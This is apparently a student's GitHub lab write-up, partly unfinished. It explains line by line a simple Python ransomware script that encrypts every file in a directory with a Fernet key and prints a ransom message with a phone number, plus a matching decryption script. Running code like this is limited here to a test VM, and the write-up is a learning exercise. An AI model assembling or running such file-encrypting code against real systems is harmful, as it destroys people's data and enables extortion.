# Ransomware
Deploying ransomware using Python

## Objective


As ransomware attacks have been on a steady upward trend, I wanted to take the time to understand one of the methods of carrying out a ransomware attacks.

### Skills Learned


- Advanced understanding of SIEM concepts and practical application.
- Python scripting
- Cryptography
- 


### Tools Used
[Bullet Points - Remove this afterwards]

- Python
  

## Steps

First we are going to spin up an Ubuntu VM

Next we will create a directory with several files that we are going to test our ransomware on.

So we insert into the CLI "mkdir ransomware" to create the directory and inside the directory, run "echo "file content" > filename.txt" a few times to create several files.

Next we will create the Python script file.

![Encryption](https://github.com/user-attachments/assets/edf5a8c4-e0b2-4010-b4cf-8c5a9ea1bffd)


To make this project easier to read I will briefly notate each line of code seperated by "//" to explain its utility in the script.

First we have to include the shebang #! so that Linux runs the file as a script.

Import os // allows python to interact with the OS.

from cryptography.fernet import Fernet // 128bit AES

files = [] // This will create an empty list called files.

for file in os.listdir() // This is a for loop and will list all the files in the directory.

if os.path.isfile(file) // if object is a file add to encryption list

if file == "MALWARE.py" or file == "thekey.key" or file == "DECRYPT.py" : (next line)continue(next line) files.append(file) // This is seperating our script files that are in the same directory from the file list we created earlier in the script.

print(files) // Will display the "files" list in the terminal.

ref: test print

key = Fernet.generate_key() // This will generate the encryption key.

with open("thekey.key", "wb") as thekey: // This line uses the open function to open the file in script in write mode and reference the variable as "thekey" throughout the script.

for file in files: // This is creating a loop for the file's in the files list created earlier.

with open(file, "rb") as thefile: // This line will open the file's in the list in read binary mode and assigned the alias "thefile".

contents = thefile.read() // we have now made contents a alias to the file.read.

contents_encrypted = Fernet(key).encrypt(contents) // This line encrypt the contents with the Fernet key.

with open(file, "wb") as thefile: // sets script to write to "thefile".

thefile.write(contents_encrypted) // writes the "contents_encrypted" to the file.

print("All of your files have been encrypted. Contact 890-589-5542 to decrypt your data, for a price") // This is displayed in the terminal when the Python script is executed

DECRYPT

![Decryption](https://github.com/user-attachments/assets/5d1837e5-909c-4cf7-9fe0-a973e5fd3e94)


The first half of the script from the beginning up until the "print(files)" line is the same as the MALWARE.py script, I will not reiterate these lines for obvious reasons.

with open("thekey.key", "rb") as key: // opens key file in read binary mode making "key" a variable.

secretkey = key.read() // The "secretkey" equals the contents of the file variable assigned as "key", the ".read" will make the encryption key functional in the decryption portion of the script.

secretphrase = "112113114" // This is going to be the password that decrypts the files.




The for loop is going to remain similar with a few changes. 

contents_decrypted = Fernet(secretkey).decrypt(contents) // This decrypts the files using the decryption key generated by Fernet. 

thefile.write(contents_decrypted) // The contents are now written back to the file.

![results](https://github.com/user-attachments/assets/ef007d90-74cf-40ae-b97d-67d0827bd6ac)

with = resource management as = used along with to allocater where to input resources / for = loop

no dropper

*Ref 1: Network Diagram*
